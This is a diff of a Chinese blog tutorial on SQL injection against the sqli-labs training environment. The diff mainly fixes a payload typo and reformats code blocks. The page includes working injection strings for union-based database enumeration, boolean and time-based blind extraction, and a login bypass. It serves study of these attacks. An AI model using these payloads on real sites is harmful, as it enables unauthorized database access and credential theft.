@@ -129,7 +129,7 @@
 <meta property="og:image" content="http://sher0.github.io/img/less7-4.jpg">
 <meta property="og:image" content="http://sher0.github.io/img/less7-5.jpg">
 <meta property="og:image" content="http://sher0.github.io/img/less7-6.jpg">
-<meta property="og:updated_time" content="2017-08-13T12:18:07.252Z">
+<meta property="og:updated_time" content="2017-08-13T12:21:37.323Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql学习（一）">
 <meta name="twitter:description" content="前言  最近花了一些时间把sql注入方面的基础知识结合sqlilabs的教程看完了，这里就做一个总结。 基础知识1.sql注入原理SQL注入漏洞的形成原因是：用户输入的数据或语句被sql解释器执行，而我们所要做的就是利用SQL注入绕过登录验证 2.sql注入分类分类见仁见智，就最基础的可大致这样来看 基于从服务器接收到的响应  基于错误的SQL注入 联合查询 sql盲注  基于注入点位置上的  p">
@@ -433,7 +433,7 @@
 <pre><code>?id=1&apos; or 1=1 --+
 </code></pre><p><img src="/img/less1-2.jpg" alt="Alt text"></p>
 <p>回显正确。<br>针对此类注入，因为没有任何绕过，我们即可进行最简单的注入操作。</p>
-<pre><code>?id1&apos; order by 3 --+
+<pre><code>?id=1&apos; order by 3 --+
 </code></pre><p>猜解出有3列数据，接下来使用联合查询<br>（union查询即同时查询多个语句，我们通过使第一个语句错误，来执行写入的sql语句）</p>
 <p>爆数据库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/less-3.jpg" alt="Alt text"><br>我们可以看到爆出了数据库名称，这里选择security数据库</p>
@@ -491,10 +491,11 @@
 <pre><code>?id=1 and left(database(),1)&gt;&apos;a&apos;--+
 </code></pre><p>查看数据库第一位是否&gt;a  由于我们的数据库为’security’,很明显是大于的，页面也返回正常</p>
 <pre><code>?id=1&apos; and left(database(),2)&gt;&apos;sa&apos;--+
-</code></pre><p>查看前两位是否大于sa    以此类推，利用二分法可得出数据库的名称。<br>补：也可以利用substr()和ascii()将得到的内容转换成ascii值来得出名称<br>比如查询security数据库下的第一个表的第一个字符<br>···<br>?id=1 and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;80<br>···</p>
+</code></pre><p>查看前两位是否大于sa    以此类推，利用二分法可得出数据库的名称。<br>补：也可以利用substr()和ascii()将得到的内容转换成ascii值来得出名称<br>比如查询security数据库下的第一个表的第一个字符<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=<span class="number">1</span> and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)&gt;<span class="number">80</span></div></pre></td></tr></table></figure></p>
 <p>此处仍然用二分法进行测试，直到回显正确。可以得到ascii值为101的时候正确，因为第一个表是email，e的ascii码为101  改变substr的数字，即可得到后面的字符</p>
 <p>查看列</p>
-<p> 可利用regexp 正则匹配来获取user表中的列<br>···<br>?id=1’ and 1=(select 1 from information_schema.columns where table_name=’users’ and table_name regexp ‘~us[a-z]’ limit 0,a)–+<br>···<br>即查询users表中是否存在为us**的列，页面回显正常2即为存在，以此种方法我们可以查出username和password</p>
+<p> 可利用regexp 正则匹配来获取user表中的列<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1' and 1=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> table_name regexp <span class="string">'~us[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,a)<span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p>即查询users表中是否存在为us**的列，页面回显正常2即为存在，以此种方法我们可以查出username和password</p>
 <p>以上几种方法通用，选择任何一种方法都能爆出数据，但此中方法花费时间较长，不推荐使用。</p>
 <p>此部分可参考Lcamry的mysql-injection</p>
 <p>③:利用延迟注入，延时注入主要是针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术<br>基础知识</p>
@@ -506,7 +507,6 @@
 <p>延时注入的原理就是，所要报的信息的ascii码正确时，产生延时，否则不延时。（反过来也可）</p>
 <pre><code>?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+
 </code></pre><p>意思是数据库名称第一个字符的ascii码是否为115，正确则返回页面，错误则产生5s的时间延迟。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。<br>也有benchmark()延时注入，与sleep用法相似。</p>
-<p>此种方法的应用在下面的其他类型注入中再来详细讲解。</p>
 <p><strong>3.POST型注入</strong></p>
 <p>post即是数据从客户端提交到服务器端</p>
 <p>当我们输入正确的用户名和密码，回显正确。<br><img src="/img/less11-1.jpg" alt="Alt text"><br>在post过程中，我们输入用户名和密码后台也能形成sql语句，我们就可以像get型一样构造post的payload。<br><img src="/img/less11-2.jpg" alt="Alt text"><br>我们可以输入万能用户名来测试<br>username:admin ‘#<br>password:123（随便输）<br><img src="/img/less11-3.jpg" alt="Alt text"><br>我们可以看到对单引号的处理，接着我们尝试输入<br>username:admin’ or ‘1’=’1#  密码随意  得到回显正确</p>
